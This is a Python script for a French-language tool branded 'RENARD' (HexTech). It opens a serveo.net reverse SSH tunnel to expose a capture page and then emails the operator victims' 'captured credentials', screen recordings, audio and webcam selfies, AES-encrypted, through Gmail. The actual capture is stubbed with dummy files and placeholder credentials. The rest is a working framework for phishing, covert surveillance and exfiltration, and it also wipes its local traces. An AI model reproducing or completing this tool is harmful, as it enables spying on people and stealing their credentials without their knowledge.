import os
import sys
import time
import smtplib
import socket
import subprocess
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import logging
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64
import json

# Configuration
CONFIG = {
    'TEMP_DIR': "captures",
    'SERVER_TIMEOUT': 30,
    'AUDIO_DURATION': 12,
    'SCREEN_DURATION': 12,
    'SELFIE_COUNT': 8,
    'MAX_FILE_SIZE': 10 * 1024 * 1024,  # 10MB
    'AES_KEY_SIZE': 32  # 256 bits
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('surveillance.log'),
        logging.StreamHandler()
    ]
)

class SecureSurveillance:
    def __init__(self):
        os.makedirs(CONFIG['TEMP_DIR'], exist_ok=True)
        self.files_to_send = []
        self.user_email = ""
        self.app_password = ""
        self.aes_key = get_random_bytes(CONFIG['AES_KEY_SIZE'])
        self.iv = get_random_bytes(16)  # Initialization vector for AES
        
    def show_banner(self):
        """Bannière ASCII améliorée"""
        banner = r"""
█╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗
██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║
██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║
██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
-------------------------------------------------------
   ╔═════════════════════════════════════════════╗
   ║       [✓] TOOL NAME : RENARD                                            
   ║       [✓] GITHUB : SAMSMIS01                
   ║       [✓] TELEGRAM : https://t.me/hextechcar  ║
   ║       [✓] INSTAGRAM : SAMSMIS01
   ║       [✓] EMAIL : hextech243@gmail.com         ╚═══════════════════════════════════════════════╝
--------------------------------------------------------
"""
        print(f"\033[1;32m{banner}\033[0m")

    def encrypt_file(self, filepath):
        """Chiffrement AES des fichiers"""
        try:
            with open(filepath, 'rb') as f:
                plaintext = f.read()
            
            cipher = AES.new(self.aes_key, AES.MODE_CBC, self.iv)
            ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
            
            encrypted_path = f"{filepath}.enc"
            with open(encrypted_path, 'wb') as f:
                f.write(self.iv)  # Écrire le IV au début du fichier
                f.write(ciphertext)
                
            return encrypted_path
        except Exception as e:
            logging.error(f"Erreur chiffrement: {str(e)}")
            return None

    def decrypt_file(self, filepath):
        """Déchiffrement AES des fichiers"""
        try:
            with open(filepath, 'rb') as f:
                iv = f.read(16)  # Lire le IV
                ciphertext = f.read()
            
            cipher = AES.new(self.aes_key, AES.MODE_CBC, iv)
            plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
            
            decrypted_path = filepath.replace('.enc', '')
            with open(decrypted_path, 'wb') as f:
                f.write(plaintext)
                
            return decrypted_path
        except Exception as e:
            logging.error(f"Erreur déchiffrement: {str(e)}")
            return None

    def secure_tunnel(self):
        """Établir un tunnel SSH sécurisé avec Serveo"""
        try:
            logging.info("Établissement du tunnel sécurisé...")
            
            # Vérifier si SSH est disponible
            if not self._check_ssh_available():
                raise Exception("OpenSSH n'est pas installé")
            
            # Commande pour établir le tunnel
            cmd = [
                "ssh", "-o", "StrictHostKeyChecking=yes",
                "-o", "PasswordAuthentication=no",
                "-R", "80:localhost:5000", "serveo.net"
            ]
            
            tunnel = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Attendre que le tunnel soit établi
            url = None
            for line in iter(tunnel.stderr.readline, ''):
                if "Forwarding" in line:
                    url = line.strip().split()[-1]
                    logging.info(f"Tunnel établi: {url}")
                    break
            
            if not url:
                raise Exception("Échec de la création du tunnel")
                
            return url
            
        except Exception as e:
            logging.error(f"Erreur tunnel: {str(e)}")
            self.cleanup()
            return None

    def secure_email(self, credentials):
        """Envoyer un email sécurisé avec les captures"""
        try:
            # Vérification des identifiants
            if not all([self.user_email, self.app_password]):
                raise Exception("Identifiants email manquants")
            
            # Préparation du message
            msg = MIMEMultipart()
            msg['From'] = self.user_email
            msg['To'] = self.user_email
            msg['Subject'] = '🔒 HexTech Renard - Captures Sécurisées'
            
            # Corps du message
            body = f"""
            ⚠️ NE PAS PARTAGER ⚠️
            
            Timestamp: {time.ctime()}
            Identifiants capturés: 
            {json.dumps(credentials, indent=2)}
            
            Fichiers joints: {len(self.files_to_send)}
            Clé AES: {base64.b64encode(self.aes_key).decode()}
            """
            msg.attach(MIMEText(body, 'plain'))
            
            # Ajouter les pièces jointes chiffrées
            for filepath in self.files_to_send:
                if os.path.exists(filepath):
                    encrypted_file = self.encrypt_file(filepath)
                    if encrypted_file:
                        with open(encrypted_file, 'rb') as f:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition',
                            f'attachment; filename="{os.path.basename(encrypted_file)}"'
                        )
                        msg.attach(part)
            
            # Envoyer l'email via SMTP SSL
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30) as server:
                server.login(self.user_email, self.app_password)
                server.send_message(msg)
            
            logging.info("Email sécurisé envoyé avec succès")
            return True
            
        except Exception as e:
            logging.error(f"Erreur envoi email: {str(e)}")
            return False

    def run(self):
        try:
            self.show_banner()
            
            # Demander les identifiants
            self.user_email = input("\033[35m[SECURE] Email Gmail: \033[0m").strip()
            self.app_password = input("\033[35m[SECURE] Mot de passe d'application: \033[0m").strip()
            
            # Validation des entrées
            if not all([self.user_email.endswith('@gmail.com'), len(self.app_password) >= 16]):
                raise Exception("Authentification invalide - Utilisez un email Gmail et un mot de passe d'application")
            
            # Établir le tunnel
            url = self.secure_tunnel()
            if not url:
                return
                
            print(f"\033[36m[SECURITY] URL de capture: {url}\033[0m")
            logging.info("En attente des données client...")
            
            # Simuler les captures (à remplacer par le vrai code)
            self._simulate_captures()
            
            # Envoyer l'email
            if self.secure_email({"user": "test", "pass": "1234"}):
                print("\033[32m[SUCCESS] Vérifiez votre boîte mail pour les captures!\033[0m")
            else:
                print("\033[31m[ERROR] Échec de l'envoi des captures\033[0m")
                
        except KeyboardInterrupt:
            logging.info("Interruption par l'utilisateur")
        except Exception as e:
            logging.error(f"Erreur système: {str(e)}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Nettoyage sécurisé des fichiers temporaires"""
        try:
            # Suppression sécurisée des fichiers
            for root, _, files in os.walk(CONFIG['TEMP_DIR']):
                for file in files:
                    path = os.path.join(root, file)
                    try:
                        # Écraser le fichier avant suppression
                        with open(path, 'wb') as f:
                            f.write(os.urandom(os.path.getsize(path)))
                        os.unlink(path)
                    except:
                        pass
                        
            logging.info("Nettoyage sécurisé effectué")
        except:
            pass

    def _check_ssh_available(self):
        """Vérifier si SSH est installé"""
        try:
            subprocess.run(["ssh", "-V"], check=True, capture_output=True)
            return True
        except:
            return False

    def _simulate_captures(self):
        """Simuler des captures pour le test"""
        logging.info("Simulation des captures...")
        time.sleep(2)
        
        # Créer des fichiers de test
        self.files_to_send = [
            os.path.join(CONFIG['TEMP_DIR'], "screen.webm"),
            os.path.join(CONFIG['TEMP_DIR'], "audio.wav")
        ]
        
        for i in range(CONFIG['SELFIE_COUNT']):
            self.files_to_send.append(
                os.path.join(CONFIG['TEMP_DIR'], f"selfie_{i+1}.jpg")
            )
        
        for f in self.files_to_send:
            with open(f, 'wb') as tmp:
                tmp.write(os.urandom(1024))  # Fichier factice

if __name__ == "__main__":
    # Vérifier les dépendances
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("\033[31mInstallez pycryptodome: pip install pycryptodome\033[0m")
        sys.exit(1)
        
    # Lancer l'application
    app = SecureSurveillance()
    app.run()